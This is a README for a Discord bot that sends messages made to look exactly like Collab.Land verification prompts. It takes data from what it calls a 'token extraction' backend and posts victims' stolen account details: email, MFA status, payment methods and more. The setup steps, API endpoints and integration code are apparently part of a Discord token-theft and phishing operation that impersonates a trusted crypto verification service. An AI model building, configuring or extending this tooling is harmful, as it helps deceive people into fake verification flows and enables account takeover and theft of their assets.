# Discord Verification Bot (Collab.Land Style)

A professional Discord bot that sends verification messages exactly like Collab.Land, complete with interactive buttons and rich embeds.

## 🚀 Features

- **Collab.Land Style Messages** - Professional verification embeds
- **Interactive Buttons** - "Let's go!", "Docs", "Donate" buttons
- **Rich User Data Display** - Shows username, email, Nitro status, etc.
- **Community Stats** - Displays member count with country flags
- **Configurable Links** - Customize all button URLs
- **Real-time API** - Integration with token extraction system

## 📋 Setup Instructions

### Step 1: Create Discord Bot

1. Go to https://discord.com/developers/applications
2. Click "New Application" → Give it a name (e.g., "Verification Bot")
3. Go to "Bot" → Click "Add Bot"
4. Copy the **Bot Token** 
5. Enable these permissions:
   - Send Messages
   - Use Slash Commands
   - Embed Links
   - Read Message History

### Step 2: Add Bot to Server

1. Go to "OAuth2" → "URL Generator"
2. Select "bot" scope
3. Select permissions: Send Messages, Embed Links, Use Slash Commands
4. Copy generated URL and open it
5. Add bot to your Discord server

### Step 3: Get Channel ID

1. Enable Developer Mode in Discord (User Settings → Advanced → Developer Mode)
2. Right-click your target channel → "Copy ID"
3. Save this Channel ID

### Step 4: Configure Bot

Edit `config.json` with your credentials:

```json
{
  "discord": {
    "botToken": "YOUR_ACTUAL_BOT_TOKEN_HERE",
    "channelId": "YOUR_ACTUAL_CHANNEL_ID_HERE", 
    "serverId": "YOUR_SERVER_ID_HERE"
  }
}
```

## 🔧 Running the Bot

```bash
# Install dependencies
npm install

# Start the bot
node bot.js
```

The bot will start on port 3001 by default.

## 📡 API Endpoints

### Health Check
```bash
GET http://localhost:3001/health
```

### Configure Bot
```bash
POST http://localhost:3001/configure
{
  "botToken": "your_bot_token",
  "channelId": "your_channel_id",
  "serverId": "your_server_id",
  "botName": "Custom Bot Name",
  "docsUrl": "https://your-docs.com",
  "donateUrl": "https://your-donate.com"
}
```

### Test Bot
```bash
POST http://localhost:3001/test
```

### Send Verification Message
```bash
POST http://localhost:3001/send-verification
{
  "tokenData": {
    "username": "john_doe",
    "userId": "123456789",
    "email": "john@example.com",
    "nitro": "Active Premium",
    "mfa": true,
    "verified": true,
    "guildCount": 15,
    "friendCount": 42,
    "paymentMethods": 2,
    "source": "Token Extraction"
  }
}
```

## 🎨 Customization

### Modify Message Appearance

Edit the embed settings in `bot.js`:

```javascript
// Customize colors
.setColor(0x5865F2) // Discord blue

// Customize title and description
.setTitle('🔐 Your Custom Title')
.setDescription('Your custom description here...')

// Customize button labels
.setLabel('Your Custom Button')
```

### Modify Button URLs

Update the links in the configuration or via API:

```javascript
const DOCS_URL = 'https://your-custom-docs.com';
const DONATE_URL = 'https://your-custom-donate.com';
```

### Add Custom Fields

Add more fields to the embed:

```javascript
.addFields({
  name: '🔒 Security Level',
  value: 'High Security Account',
  inline: true
})
```

## 🔗 Integration with Main Backend

The main token extraction backend can call this Discord bot:

```javascript
// In your main backend
const response = await fetch('http://localhost:3001/send-verification', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    tokenData: {
      username: tokenData.username,
      userId: tokenData.userId,
      email: tokenData.email,
      // ... other token data
    }
  })
});
```

## 🎯 Message Preview

The bot sends messages that look exactly like Collab.Land:

```
🤖 Collab.Land APP Today at 1:25 PM

🔐 Verify your assets

john_doe, your account verification is required.

This is a read-only connection. Do not share your private keys. We 
will never ask for your seed phrase. We will never DM you.

👤 User Information          🎮 Account Details          💰 Account Value
Username: john_doe           Nitro: Active Premium       Servers: 15
User ID: 123456789          MFA: ✅ Enabled             Friends: 42  
Email: john@example.com     Verified: ✅ Yes            Payment Methods: 2

🌍 Community Stats
✅ 🔴 ❤️ 🇧🇷 🇮🇳 🇻🇳 🇨🇳 🇺🇸 3,847 members verified

[🚀 Let's go!]  [📚 Docs]  [💰 Donate]

Captured via Token Extraction • 1/21/2025, 10:30:45 AM
```

## 🛡️ Security Notes

- Never share your bot token publicly
- Use environment variables for production
- Monitor bot permissions regularly
- Log all interactions for security

## 🔧 Troubleshooting

### Bot Not Responding
- Check bot token is correct
- Verify bot has proper permissions
- Ensure bot is added to the server

### Messages Not Sending
- Verify channel ID is correct
- Check bot has Send Messages permission in that channel
- Confirm bot is online (green status)

### Buttons Not Working
- Ensure bot has Use Slash Commands permission
- Check button interaction handlers are set up
- Verify button custom IDs are unique

## 📞 Support

If you need help:
1. Check the console logs for error messages
2. Verify all configuration settings
3. Test with the `/test` endpoint first
4. Check Discord Developer Portal for bot status
